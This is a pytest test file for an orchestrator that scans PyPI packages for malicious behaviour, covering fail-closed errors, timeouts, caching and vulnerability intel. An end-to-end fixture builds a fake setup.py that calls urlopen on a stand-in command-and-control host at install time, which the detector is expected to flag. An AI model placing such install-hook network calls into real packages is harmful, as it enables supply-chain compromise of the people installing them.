"""Tests for the analysis orchestrator (pipeline contract, SPEC section 3).

Fetchers, analyzers, the model and the verdict cache are all in-process fakes: no network,
no Redis, no package code. Vulnerability evidence below is a labelled test fixture.
"""

from __future__ import annotations

import json
import threading
import time
from dataclasses import asdict

import pytest

from app.analysis import analyzers as registry
from app.analysis import orchestrator as orch
from app.analysis import scoring
from app.analysis.analyzers.base import (
    ArtifactInfo,
    BaseAnalyzer,
    InventoryEntry,
    PackageContext,
    ReleaseInfo,
    ScanOptions,
    SourceFile,
    ToolStatus,
)
from app.analysis.analyzers.typosquat import TyposquatAnalyzer
from app.analysis.correlation import engine as correlation_engine
from app.analysis.correlation.engine import CorrelationResult
from app.analysis.findings import Finding, Severity
from app.analysis.orchestrator import AnalysisResult, Orchestrator, _cache_key
from app.analysis.signals import Capability, Code


# --------------------------------------------------------------------------- fakes
class _NoModel:
    available = False
    metadata: dict = {}

    def predict(self, features):
        return 0, 0.0


class FakeCache:
    def __init__(self) -> None:
        self.store: dict[str, str] = {}
        self.sets = 0

    def get_json(self, key):
        raw = self.store.get(key)
        return json.loads(raw) if raw else None

    def set_json(self, key, value, ttl):
        self.store[key] = json.dumps(value, default=str)
        self.sets += 1


class BrokenCache:
    def get_json(self, key):
        raise ConnectionError("redis down")

    def set_json(self, key, value, ttl):
        raise ConnectionError("redis down")


class RecordingLogger:
    def __init__(self) -> None:
        self.events: list[tuple[str, dict]] = []

    def _record(self, event, **kw):
        self.events.append((event, kw))

    info = warning = error = debug = _record


def make_ctx(name="demo", version="1.0.0", **kw) -> PackageContext:
    return PackageContext(ecosystem="pypi", name=name, version=version, **kw)


class Fetcher:
    """Warden X signature: build_context(name, version, options)."""

    def __init__(self, ctx: PackageContext | None = None) -> None:
        self.ctx = ctx
        self.calls: list[tuple] = []

    def build_context(self, name, version, options=None):
        self.calls.append((name, version, options))
        return self.ctx if self.ctx is not None else make_ctx(name, version or "1.0.0")


class V1Fetcher:
    """v1 / test-fake signature: build_context(name, version)."""

    def __init__(self) -> None:
        self.calls = 0

    def build_context(self, name, version):
        self.calls += 1
        return make_ctx(name, version or "1.0.0")


class Stub(BaseAnalyzer):
    def __init__(self, name, findings=(), *, version="9.9.9", requires_network=False, available=True,
                 exc=None, wait_event=None, delay=0.0, output=None, barrier=None) -> None:
        self.name = name
        self.version = version
        self.requires_network = requires_network
        self._findings = list(findings)
        self._available = available
        self._exc = exc
        self._event = wait_event
        self._delay = delay
        self._output = output
        self._barrier = barrier
        self.calls = 0

    def availability(self):
        return ToolStatus(self.name, self._available, detail=None if self._available else "tool not found on PATH")

    def analyze(self, ctx):
        self.calls += 1
        if self._barrier is not None:
            self._barrier.wait()
        if self._event is not None:
            self._event.wait(30)
        if self._delay:
            time.sleep(self._delay)
        if self._exc is not None:
            raise self._exc
        return self._output if self._output is not None else list(self._findings)


def F(code, severity=Severity.low, weight=1.0, evidence=None, **kw) -> Finding:
    return Finding(code, severity, weight, f"test {code}", evidence or {}, **kw)


@pytest.fixture(autouse=True)
def _isolated(monkeypatch):
    monkeypatch.setattr(scoring, "get_model_store", lambda: _NoModel())
    monkeypatch.setattr(orch.settings, "INTEL_OFFLINE", False)
    monkeypatch.setattr(orch.settings, "ANALYZER_WORKERS", 4)
    monkeypatch.setattr(orch.settings, "ANALYZER_TIMEOUT_SECONDS", 60)
    monkeypatch.setattr(orch.settings, "SCAN_TIMEOUT_SECONDS", 180)
    monkeypatch.setattr(orch.settings, "ENABLED_ANALYZERS", [])
    monkeypatch.setattr(orch.settings, "DISABLED_ANALYZERS", [])
    monkeypatch.setattr(orch.settings, "SCORE_FUSION", "max")


def run(analyzers, ctx=None, options=None, cache=None, name="demo", version="1.0.0"):
    cache = cache if cache is not None else FakeCache()
    o = Orchestrator(Fetcher(ctx), analyzers=analyzers, cache_backend=cache)
    return o.analyze("pypi", name, version, options), cache


def codes(result) -> list[str]:
    return [s["code"] for s in result.signals]


# --------------------------------------------------------------------------- result contract
def test_result_contract_and_finding_stamping():
    alpha = Stub("alpha", [F(Code.NETWORK_EGRESS, Severity.low, 1.5, capability=Capability.NETWORK)])
    result, _ = run([alpha, TyposquatAnalyzer()], ctx=make_ctx("reqeusts"), name="reqeusts")

    by_code = {s["code"]: s for s in result.signals}
    assert by_code[Code.NETWORK_EGRESS]["analyzer"] == "alpha"
    assert by_code[Code.NETWORK_EGRESS]["analyzer_version"] == "9.9.9"
    assert by_code[Code.NETWORK_EGRESS]["category"] == "capability"
    assert by_code[Code.NETWORK_EGRESS]["title"] == "Network egress capability"
    assert by_code[Code.TYPOSQUAT]["analyzer"] == "typosquat"
    assert by_code[Code.TYPOSQUAT]["analyzer_version"] == "1.1.0"
    assert all(s["finding_id"].startswith("WX-") for s in result.signals)

    assert result.risk["method"] == "warden-risk-2.0"
    assert result.risk_score == result.risk["final_score"]
    assert result.severity == result.risk["severity"]
    assert result.rule_score == result.risk["rule_score"]
    assert result.capabilities == sorted({Capability.NETWORK, Capability.TYPOSQUAT})
    assert result.cached is False
    assert result.analyzer_version == orch.settings.ANALYZER_VERSION
    assert result.attack_chains == []
    assert result.scan_options["effective_offline"] is False

    runs = {r["name"]: r for r in result.analyzer_runs}
    assert runs["alpha"] == {"name": "alpha", "version": "9.9.9", "status": "ok", "duration_ms": runs["alpha"][
        "duration_ms"], "finding_count": 1, "detail": None}
    assert runs["typosquat"]["status"] == "ok"
    assert runs["correlation"]["status"] == "ok"
    json.dumps(asdict(result))  # fully serialisable


def test_v1_positional_construction_still_works():
    r = AnalysisResult("pypi", "x", "1.0", 5, 3, 5, "info", {}, [], "1.0.0", 30, True)
    assert r.cached is False and r.capabilities == []
    assert r.risk == {} and r.analyzer_runs == [] and r.vulnerabilities == [] and r.model_version is None
    r2 = AnalysisResult("pypi", "x", "1.0", 5, 3, 5, "info", {}, [], "1.0.0", 30, True, capabilities=["ioc"])
    assert r2.capabilities == ["ioc"]


def test_fetcher_receives_options_and_ctx_carries_them():
    options = ScanOptions(intel=False, private_namespaces=("acme-*",))
    ctx = make_ctx()
    fetcher = Fetcher(ctx)
    Orchestrator(fetcher, analyzers=[], cache_backend=FakeCache()).analyze("pypi", "demo", "1.0.0", options)
    assert fetcher.calls == [("demo", "1.0.0", options)]
    assert ctx.options is options


def test_v1_two_argument_fetcher_is_supported():
    fetcher = V1Fetcher()
    seen = []

    class Probe(BaseAnalyzer):
        name = "probe"

        def analyze(self, ctx):
            seen.append(ctx.options)
            return []

    options = ScanOptions(offline=True)
    result = Orchestrator(fetcher, analyzers=[Probe()], cache_backend=FakeCache()).analyze("pypi", "d", None, options)
    assert fetcher.calls == 1
    assert seen == [options]
    assert result.version == "1.0.0"


# --------------------------------------------------------------------------- fail closed
def test_crashing_analyzer_fails_closed_without_leaking_the_message(monkeypatch):
    logger = RecordingLogger()
    monkeypatch.setattr(orch, "log", logger)
    secret_message = "boom secret-token-value-XYZ /home/user/.ssh/id_rsa"
    crasher = Stub("crasher", exc=RuntimeError(secret_message))
    healthy = Stub("healthy", [F(Code.NETWORK_EGRESS, Severity.low, 1.5)])
    result, cache = run([crasher, healthy])

    [error] = [s for s in result.signals if s["code"] == Code.ANALYZER_ERROR]
    assert error["severity"] == "medium" and error["weight"] == 2.0 and error["confidence"] == 1.0
    assert error["evidence"] == {"analyzer": "crasher", "status": "error", "error_type": "RuntimeError"}
    assert error["analyzer"] == "crasher"
    assert Code.NETWORK_EGRESS in codes(result)  # other analyzers still ran
    runs = {r["name"]: r for r in result.analyzer_runs}
    assert runs["crasher"]["status"] == "error" and runs["crasher"]["detail"] == "RuntimeError"

    serialised = json.dumps(asdict(result)) + json.dumps(logger.events, default=str)
    assert "secret-token-value-XYZ" not in serialised
    assert "id_rsa" not in serialised
    assert cache.sets == 0  # incomplete verdicts are never cached
    assert result.risk_score >= 9  # ANALYZER_ERROR raises risk


@pytest.mark.parametrize("bad_output", [None, "not-a-list", [{"code": "IOC_MATCH"}], [F(Code.NEW_PACKAGE), 42]])
def test_malformed_analyzer_output_is_an_error(bad_output):
    result, _ = run([Stub("weird", output=bad_output if bad_output is not None else object())])
    [error] = [s for s in result.signals if s["code"] == Code.ANALYZER_ERROR]
    assert error["evidence"]["error_type"] == "InvalidAnalyzerOutput"


def test_system_exit_inside_an_analyzer_is_contained():
    result, _ = run([Stub("exits", exc=SystemExit(1))])
    [error] = [s for s in result.signals if s["code"] == Code.ANALYZER_ERROR]
    assert error["evidence"]["error_type"] == "SystemExit"


def test_slow_analyzer_times_out_and_scan_continues(monkeypatch):
    monkeypatch.setattr(orch.settings, "ANALYZER_TIMEOUT_SECONDS", 0.3)
    release = threading.Event()
    slow = Stub("slow", [F(Code.IOC_MATCH, Severity.critical, 12.0)], wait_event=release)
    fast = Stub("fast", [F(Code.NEW_PACKAGE)])
    try:
        start = time.monotonic()
        result, cache = run([slow, fast])
        elapsed = time.monotonic() - start
    finally:
        release.set()
    assert elapsed < 10
    runs = {r["name"]: r for r in result.analyzer_runs}
    assert runs["slow"]["status"] == "timeout"
    assert runs["fast"]["status"] == "ok"
    [error] = [s for s in result.signals if s["code"] == Code.ANALYZER_ERROR]
    assert error["evidence"] == {"analyzer": "slow", "status": "timeout", "error_type": "TimeoutError"}
    assert Code.IOC_MATCH not in codes(result)  # late results are discarded
    assert cache.sets == 0


def test_scan_timeout_bounds_total_time(monkeypatch):
    monkeypatch.setattr(orch.settings, "SCAN_TIMEOUT_SECONDS", 0.5)
    monkeypatch.setattr(orch.settings, "ANALYZER_WORKERS", 1)
    release = threading.Event()
    first, second = Stub("first", wait_event=release), Stub("second", wait_event=release)
    try:
        start = time.monotonic()
        result, _ = run([first, second])
        elapsed = time.monotonic() - start
    finally:
        release.set()
    assert elapsed < 10
    runs = {r["name"]: r for r in result.analyzer_runs}
    assert runs["first"]["status"] == "timeout" and runs["first"]["detail"] == "exceeded scan timeout"
    assert runs["second"]["status"] == "timeout" and runs["second"]["detail"] == "scan timeout before start"
    assert codes(result).count(Code.ANALYZER_ERROR) == 2


def test_analyzers_run_concurrently(monkeypatch):
    monkeypatch.setattr(orch.settings, "ANALYZER_WORKERS", 3)
    barrier = threading.Barrier(3, timeout=10)  # only passable if all three run at once
    analyzers = [Stub(f"a{i}", [F(Code.NEW_PACKAGE, evidence={"i": i})], barrier=barrier) for i in range(3)]
    result, _ = run(analyzers)
    assert Code.ANALYZER_ERROR not in codes(result)
    assert [r["status"] for r in result.analyzer_runs[:3]] == ["ok", "ok", "ok"]


def test_finding_order_follows_registry_not_completion_order():
    slow = Stub("slow_first", [F(Code.NEW_PACKAGE, evidence={"who": "slow"})], delay=0.3)
    fast = Stub("fast_second", [F(Code.NO_SOURCE_REPO, evidence={"who": "fast"})])
    result, _ = run([slow, fast])
    assert codes(result) == [Code.NEW_PACKAGE, Code.NO_SOURCE_REPO]
    assert [r["name"] for r in result.analyzer_runs[:2]] == ["slow_first", "fast_second"]


def test_findings_are_bounded_per_analyzer(monkeypatch):
    monkeypatch.setattr(orch, "MAX_FINDINGS_PER_ANALYZER", 5)
    many = [F(Code.NEW_PACKAGE, evidence={"i": i}) for i in range(20)]
    result, _ = run([Stub("noisy", many)])
    assert codes(result).count(Code.NEW_PACKAGE) == 5
    [noisy] = [r for r in result.analyzer_runs if r["name"] == "noisy"]
    assert noisy["finding_count"] == 5 and "truncated from 20 to 5" in noisy["detail"]


def test_identical_findings_are_deduplicated():
    dup = F(Code.NEW_PACKAGE, evidence={"same": True})
    result, _ = run([Stub("dupe", [dup, dup])])
    assert codes(result).count(Code.NEW_PACKAGE) == 1


# --------------------------------------------------------------------------- skipping / availability
def test_network_analyzers_skipped_when_offline(monkeypatch):
    net = Stub("vulnerability", [F(Code.KNOWN_VULNERABILITY)], requires_network=True)
    result, _ = run([net], options=ScanOptions(offline=True))
    assert net.calls == 0
    [record] = [r for r in result.analyzer_runs if r["name"] == "vulnerability"]
    assert record["status"] == "skipped" and record["detail"] == "offline"
    assert result.intel_status == {"status": "not_run", "reason": "offline"}
    assert result.risk["vulnerability_risk"] is None

    monkeypatch.setattr(orch.settings, "INTEL_OFFLINE", True)
    run([net], options=ScanOptions(offline=False))
    assert net.calls == 0

    monkeypatch.setattr(orch.settings, "INTEL_OFFLINE", False)
    run([net], options=ScanOptions(offline=False))
    assert net.calls == 1


def test_unavailable_tool_yields_status_finding_not_fake_results():
    tool = Stub("semgrep_scan", [F(Code.SEMGREP_FINDING, Severity.high, 5.0)], available=False)
    result, _ = run([tool])
    assert tool.calls == 0
    [status] = [s for s in result.signals if s["code"] == Code.TOOL_UNAVAILABLE]
    assert status["severity"] == "info" and status["weight"] == 0.0
    assert status["evidence"]["detail"] == "tool not found on PATH"
    assert Code.SEMGREP_FINDING not in codes(result)
    [record] = [r for r in result.analyzer_runs if r["name"] == "semgrep_scan"]
    assert record["status"] == "unavailable"
    assert result.risk_score == 0


def test_disabled_analyzers_are_reported_as_skipped(monkeypatch):
    # Registry-path scan: keep it offline so network-backed analyzers registered by the
    # integration layer (e.g. vulnerability intelligence) are skipped, never called.
    monkeypatch.setattr(orch.settings, "INTEL_OFFLINE", True)
    monkeypatch.setattr(orch.settings, "DISABLED_ANALYZERS", ["ioc"])
    o = Orchestrator(Fetcher(make_ctx()), cache_backend=FakeCache())
    result = o.analyze("pypi", "demo", "1.0.0")
    runs = {r["name"]: r for r in result.analyzer_runs}
    assert runs["ioc"]["status"] == "skipped" and runs["ioc"]["detail"] == "disabled by configuration"
    for name in ("metadata", "typosquat", "static_code", "install_script", "obfuscation"):
        assert runs[name]["status"] == "ok"
    assert len([r for r in result.analyzer_runs if r["name"] != "correlation"]) == len(registry.ALL_ANALYZERS)


# --------------------------------------------------------------------------- correlation
def test_correlation_chains_and_findings_are_included(monkeypatch):
    received = []

    def fake_correlate(findings):
        received.extend(findings)
        chain = F(Code.ATTACK_CHAIN, Severity.critical, 12.0, {"chain": "install->exfil"}, confidence=0.95,
                  related=tuple(f.finding_id for f in findings))
        return CorrelationResult(chains=[{"id": "chain-1", "steps": ["install", "exfil"]}], findings=[chain])

    monkeypatch.setattr(correlation_engine, "correlate", fake_correlate)
    result, _ = run([Stub("alpha", [F(Code.NETWORK_EGRESS, Severity.low, 1.5)])])
    assert [f.code for f in received] == [Code.NETWORK_EGRESS]
    assert result.attack_chains == [{"id": "chain-1", "steps": ["install", "exfil"]}]
    [chain] = [s for s in result.signals if s["code"] == Code.ATTACK_CHAIN]
    assert chain["analyzer"] == "correlation"
    assert result.risk_score == 80  # critical high-confidence attack chain floor
    [record] = [r for r in result.analyzer_runs if r["name"] == "correlation"]
    assert record["status"] == "ok" and record["finding_count"] == 1


def test_correlation_stub_produces_nothing():
    empty = correlation_engine.correlate([F(Code.NETWORK_EGRESS)])
    assert empty.chains == [] and empty.findings == []


def test_correlation_crash_fails_closed(monkeypatch):
    def broken(findings):
        raise ValueError("correlation exploded with secret-abc")

    monkeypatch.setattr(correlation_engine, "correlate", broken)
    result, cache = run([Stub("alpha")])
    [error] = [s for s in result.signals if s["code"] == Code.ANALYZER_ERROR]
    assert error["evidence"] == {"analyzer": "correlation", "status": "error", "error_type": "ValueError"}
    assert "secret-abc" not in json.dumps(asdict(result))
    assert cache.sets == 0


# --------------------------------------------------------------------------- intel / vulnerabilities
def _vuln(vid, code=Code.KNOWN_VULNERABILITY, **record):
    # Test fixture shaped like intel.models.Vulnerability.to_dict(); not a real advisory.
    return F(code, Severity.high, 0.0, {"vulnerability": {"id": vid, **record}}, confidence=0.9)


def test_vulnerabilities_and_intel_status_are_derived_from_findings():
    vuln = Stub("vulnerability", [
        _vuln("PYSEC-TEST-1", severity="high", cvss_score=7.5),
        _vuln("CVE-TEST-2", code=Code.KNOWN_EXPLOITED_VULNERABILITY, severity="medium", cvss_score=5.0),
        _vuln("PYSEC-TEST-1", severity="high", cvss_score=7.5, aliases=["dup"]),
    ])
    result, cache = run([vuln])
    assert [v["id"] for v in result.vulnerabilities] == ["PYSEC-TEST-1", "CVE-TEST-2"]
    assert result.vulnerabilities[1]["kev"] is True
    assert result.intel_status["status"] == "ok"
    assert result.risk["vulnerability_risk"] == 90
    assert result.risk_score == 90
    assert result.rule_score == 0
    assert cache.sets == 1


def test_intel_status_not_run_without_vulnerability_analyzer():
    result, _ = run([Stub("alpha")])
    assert result.intel_status == {"status": "not_run"}
    assert result.vulnerabilities == []
    assert result.risk["vulnerability_risk"] is None


def test_intel_unavailable_is_reported_and_not_cached():
    vuln = Stub("vulnerability", [F(Code.INTEL_UNAVAILABLE, Severity.info, 0.0,
                                    {"status": "unavailable", "sources": {"osv": "network"}}, confidence=1.0)])
    result, cache = run([vuln])
    assert result.intel_status["status"] == "unavailable"
    assert result.intel_status["sources"] == {"osv": "network"}
    assert result.risk["vulnerability_risk"] is None
    assert cache.sets == 0


# --------------------------------------------------------------------------- caching
def test_cache_hit_returns_cached_result_without_rerunning():
    cache = FakeCache()
    alpha = Stub("alpha", [F(Code.NEW_PACKAGE)])
    fetcher = Fetcher(make_ctx())
    o = Orchestrator(fetcher, analyzers=[alpha], cache_backend=cache)
    first = o.analyze("pypi", "demo", "1.0.0")
    second = o.analyze("pypi", "demo", "1.0.0")
    assert first.cached is False and second.cached is True
    assert alpha.calls == 1 and len(fetcher.calls) == 1 and cache.sets == 1
    assert second.risk == first.risk and second.signals == first.signals

    o.analyze("pypi", "demo", "1.0.0", ScanOptions(offline=True))  # options change results → miss
    assert alpha.calls == 2


def test_cached_payload_with_unknown_keys_is_tolerated():
    cache = FakeCache()
    o = Orchestrator(Fetcher(make_ctx()), analyzers=[], cache_backend=cache)
    o.analyze("pypi", "demo", "1.0.0")
    key = next(iter(cache.store))
    payload = json.loads(cache.store[key])
    payload["field_from_a_future_version"] = 1
    cache.store[key] = json.dumps(payload)
    assert o.analyze("pypi", "demo", "1.0.0").cached is True


def test_fetch_failed_results_are_not_cached_and_raise_risk():
    ctx = make_ctx(context_signals=[F(Code.FETCH_FAILED, Severity.medium, 3.0, {"package": "demo"}, confidence=1.0)])
    result, cache = run([], ctx=ctx)
    [fetch] = [s for s in result.signals if s["code"] == Code.FETCH_FAILED]
    assert fetch["analyzer"] == "acquisition"
    assert result.risk_score == 13
    assert cache.sets == 0


def test_cache_key_covers_analyzer_versions_and_result_changing_options(monkeypatch):
    a1, a2 = Stub("alpha", version="1.0.0"), Stub("alpha", version="1.0.1")
    base = _cache_key("pypi", "demo", "1.0.0", ScanOptions(), [a1])
    assert base == _cache_key("pypi", "demo", "1.0.0", ScanOptions(), [a1])
    assert base != _cache_key("pypi", "demo", "1.0.0", ScanOptions(), [a2])
    assert base != _cache_key("pypi", "demo", "1.0.0", ScanOptions(intel=False), [a1])
    assert base != _cache_key("pypi", "demo", "1.0.0", ScanOptions(provenance=False), [a1])
    assert base != _cache_key("pypi", "demo", "1.0.0", ScanOptions(project_context={"blast_radius": 0.5}), [a1])
    assert base == _cache_key("pypi", "demo", "1.0.0", ScanOptions(environment="staging"), [a1])  # policy only
    monkeypatch.setattr(orch.settings, "INTEL_OFFLINE", True)
    assert base != _cache_key("pypi", "demo", "1.0.0", ScanOptions(), [a1])


@pytest.mark.parametrize("setting", ["INTEL_ENABLED", "NVD_ENABLED", "PROVENANCE_ENABLED", "ANALYZE_WHEELS",
                                     "DEPCONF_ALLOW_PUBLIC_LOOKUP"])
def test_cache_key_covers_data_source_configuration(monkeypatch, setting):
    alpha = Stub("alpha")
    base = _cache_key("pypi", "demo", "1.0.0", ScanOptions(), [alpha])
    monkeypatch.setattr(orch.settings, setting, not bool(getattr(orch.settings, setting)))
    assert _cache_key("pypi", "demo", "1.0.0", ScanOptions(), [alpha]) != base


def test_intel_disabled_verdict_is_not_served_after_intelligence_is_enabled(monkeypatch):
    """Regression: INTEL_ENABLED was not in the cache key, but 'disabled' verdicts are cached."""

    class Vulnerability(BaseAnalyzer):
        name = "vulnerability"
        version = "1.0.0"

        def analyze(self, ctx):
            if not orch.settings.INTEL_ENABLED:
                return [F(Code.INTEL_UNAVAILABLE, Severity.info, 0.0, {"status": "disabled"})]
            return [_vuln("PYSEC-TEST-12", severity="critical")]

    cache = FakeCache()
    monkeypatch.setattr(orch.settings, "INTEL_ENABLED", False)
    first, _ = run([Vulnerability()], cache=cache)
    assert first.intel_status["status"] == "disabled" and cache.sets == 1
    monkeypatch.setattr(orch.settings, "INTEL_ENABLED", True)
    second, _ = run([Vulnerability()], cache=cache)
    assert second.cached is False
    assert [v["id"] for v in second.vulnerabilities] == ["PYSEC-TEST-12"]


def test_cache_outage_degrades_to_uncached_analysis():
    result, _ = run([Stub("alpha", [F(Code.NEW_PACKAGE)])], cache=BrokenCache())
    assert result.cached is False
    assert Code.NEW_PACKAGE in codes(result)


# --------------------------------------------------------------------------- summaries
def test_package_intel_summarises_context():
    ctx = make_ctx(
        version="1.0.0",
        metadata={"_maintainer_count": 2, "author": "Alice", "requires_dist": ["a>=1", "b"], "_age_days": 12.5},
        files=[SourceFile("pkg/a.py", "x = 1\n", 6)],
        binaries={"pkg/lib.so": b"\x7fELF"},
        inventory=[
            InventoryEntry("pkg/a.py", 6, "file", is_text=True, retained=True),
            InventoryEntry("pkg/lib.so", 4, "file", magic="elf", is_executable_binary=True, retained=True),
            InventoryEntry("pkg/link", 0, "symlink", skipped_reason="symlink"),
        ],
        artifacts=[ArtifactInfo("demo-1.0.0.tar.gz", "https://files.pythonhosted.org/x", "sdist")],
        analyzed_artifact=ArtifactInfo("demo-1.0.0.tar.gz", "https://files.pythonhosted.org/x", "sdist", size=10,
                                       digests={"sha256": "ab" * 32}, hash_verified=True),
        releases=[ReleaseInfo("0.9.0", "2026-01-01T00:00:00Z"), ReleaseInfo("1.0.0", "2026-02-01T00:00:00Z"),
                  ReleaseInfo("1.1.0", "2026-03-01T00:00:00Z")],
    )
    result, _ = run([], ctx=ctx)
    intel = result.package_intel
    assert intel["artifact"]["sha256"] == "ab" * 32 and intel["artifact"]["hash_verified"] is True
    assert intel["release_count"] == 3
    assert intel["first_release"]["version"] == "0.9.0"
    assert intel["previous_release"]["version"] == "0.9.0"
    assert intel["inventory"] == {"total": 3, "by_kind": {"file": 2, "symlink": 1}, "executable_binaries": 1,
                                  "skipped": 1}
    assert intel["binaries_count"] == 1 and intel["files_analyzed"] == 1
    assert intel["maintainers"]["count"] == 2 and intel["maintainers"]["author"] == "Alice"
    assert intel["requires_dist_count"] == 2
    assert result.provenance["hash_verified"] is True


def test_package_intel_reports_unknown_as_none():
    result, _ = run([], ctx=make_ctx())
    intel = result.package_intel
    assert intel["release_count"] is None
    assert intel["inventory"] is None
    assert intel["requires_dist_count"] is None
    assert intel["artifact"] is None
    assert result.provenance["status"] == "not_run"


def test_provenance_summary_from_findings():
    attested = F(Code.PROVENANCE_ATTESTED, Severity.info, 0.0, {"publisher": "github"}, confidence=0.95)
    result, _ = run([Stub("provenance", [attested])])
    assert result.provenance["status"] == "attested"
    assert result.provenance["evidence"] == {"publisher": "github"}
    failed = F(Code.PROVENANCE_FAILED, Severity.high, 8.0, {"reason": "bad signature"}, confidence=0.9)
    result, _ = run([Stub("provenance", [attested, failed])])
    assert result.provenance["status"] == "failed"


def test_end_to_end_with_real_analyzers_flags_malicious_package(monkeypatch):
    monkeypatch.setattr(orch.settings, "INTEL_OFFLINE", True)  # registry path: network analyzers are skipped
    setup_py = (
        "from setuptools import setup\n"
        "import urllib.request\n"
        "urllib.request.urlopen('http://malicious-c2.example.net/collect')\n"
        "setup(name='demo')\n"
    )
    ctx = make_ctx(files=[SourceFile("setup.py", setup_py, len(setup_py))], metadata={"_maintainer_count": 1})
    o = Orchestrator(Fetcher(ctx), cache_backend=FakeCache())
    result = o.analyze("pypi", "demo", "1.0.0")
    found = codes(result)
    assert Code.INSTALL_HOOK_EXEC in found and Code.IOC_MATCH in found
    assert result.severity == "critical" and result.risk_score >= 80
    assert Capability.IOC in result.capabilities and Capability.INSTALL_EXEC in result.capabilities
    ioc = next(s for s in result.signals if s["code"] == Code.IOC_MATCH)
    assert ioc["location"] == {"file": "setup.py", "line": 3, "column": None, "end_line": None, "snippet": None}
    assert ioc["provenance"] == "intel:bundled-ioc-snapshot"
    assert result.explanation["top_findings"][0]["severity"] == "critical"


# --------------------------------------------------------------------------- fail-closed configuration
def test_intel_switched_off_in_options_is_not_reported_as_clean():
    class HonoursSwitch(BaseAnalyzer):
        name = "vulnerability"
        requires_network = True

        def analyze(self, ctx):
            return [] if not ctx.options.intel else [_vuln("PYSEC-TEST-9", severity="critical")]

    result, cache = run([HonoursSwitch()], options=ScanOptions(intel=False))
    assert result.intel_status == {"status": "not_run", "reason": "disabled in scan options"}
    assert result.risk["vulnerability_risk"] is None
    assert result.risk["dimensions"]["vulnerability"]["score"] is None
    assert cache.sets == 1  # a deterministic scan option, safe to cache (and part of the cache key)


def test_vulnerability_analyzer_disabled_by_configuration_reports_disabled():
    tool = Stub("vulnerability", [_vuln("PYSEC-TEST-10", severity="high")], requires_network=True, available=False)
    result, cache = run([tool])
    assert tool.calls == 0
    assert result.intel_status == {"status": "disabled", "reason": "tool not found on PATH"}
    assert result.vulnerabilities == []
    assert result.risk["vulnerability_risk"] is None
    assert cache.sets == 1  # configuration, not a transient outage: cached like any complete verdict


def test_configuration_selecting_no_analyzers_fails_closed(monkeypatch):
    monkeypatch.setattr(orch.settings, "ENABLED_ANALYZERS", ["statc_code"])  # typo: matches nothing
    cache = FakeCache()
    result = Orchestrator(Fetcher(make_ctx()), cache_backend=cache).analyze("pypi", "demo", "1.0.0")
    [error] = [s for s in result.signals if s["code"] == Code.ANALYZER_ERROR]
    assert error["evidence"] == {"analyzer": "analyzer_registry", "status": "error",
                                 "error_type": "NoAnalyzersSelected"}
    assert error["severity"] == "medium" and error["weight"] == 2.0 and error["confidence"] == 1.0
    runs = {r["name"]: r for r in result.analyzer_runs}
    assert runs["analyzer_registry"]["status"] == "error"
    assert all(runs[n]["status"] == "skipped" for n in ("metadata", "static_code", "ioc"))
    assert result.risk_score >= 9
    assert cache.sets == 0
    # An explicitly injected empty analyzer list is a caller's choice, not a misconfiguration.
    assert Code.ANALYZER_ERROR not in codes(run([])[0])


def test_analyzer_runs_and_verdict_cache_lookups_are_counted_exactly_once(monkeypatch):
    """Regression: CacheClient already counts verdict lookups; the orchestrator counted them a second time."""
    from app.core.cache import CacheClient

    class FailingRedis:
        def get(self, key):
            raise ConnectionError("redis down")

        def setex(self, key, ttl, value):
            raise ConnectionError("redis down")

    observed: list[tuple] = []
    lookups: list[tuple] = []
    monkeypatch.setattr(orch.metrics, "observe_analyzer",
                        lambda name, status, duration=None: observed.append((name, status, duration)))
    monkeypatch.setattr(orch.metrics, "inc_cache", lambda cache_name, outcome: lookups.append((cache_name, outcome)))
    o = Orchestrator(Fetcher(make_ctx()), analyzers=[Stub("alpha")], cache_backend=CacheClient(connect=False))
    o.analyze("pypi", "demo", "1.0.0")
    assert o.analyze("pypi", "demo", "1.0.0").cached is True
    assert [(n, s) for n, s, _ in observed] == [("alpha", "ok"), ("correlation", "ok")]
    assert all(isinstance(d, float) and d >= 0 for _, _, d in observed)
    assert lookups == [("verdict", "miss"), ("verdict", "hit")]
    broken = CacheClient(redis_client=FailingRedis(), connect=False)
    Orchestrator(Fetcher(make_ctx()), analyzers=[], cache_backend=broken).analyze("pypi", "demo", "1.0.0")
    assert lookups[2:] == [("verdict", "error")]
